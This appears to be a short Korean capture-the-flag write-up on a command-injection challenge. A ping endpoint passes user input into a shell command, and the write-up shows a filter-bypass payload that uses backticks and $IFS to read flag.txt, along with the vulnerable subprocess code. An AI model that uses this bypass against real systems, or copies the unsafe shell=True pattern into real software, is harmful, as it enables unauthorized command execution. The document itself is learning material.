---
tier: Bronze 2
topics:
  - Command Injection
solved-with: Research
---
### 문제 구조

POST `/ping` 요청에서 입력된 ip 값이 cmd 명령어로 실행됨. 그런데 `FILTERED_CHARS` 안의 문자가 있으면 차단됨.
``` python
FILTERED_CHARS = [' ', ';', '|', '&', '>', '<', '(', ')', '[', ']', '{', '}', '\n', '\r']
...

cmd = f"ping -c 4 {ip}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
```

### 분석 및 풀이

목표: `FILTERED_CHARS`에 있는 문자를 사용하지 않고 `flag.txt` 파일 내용을 읽어야함. 

``` bash
`cat$IFS'flag.txt'`
```

### 새롭게 배운 점

- `$IFS`가 공백 대신 사용됨. 
- 백틱(\`) 안에 명령어부터 실행됨. 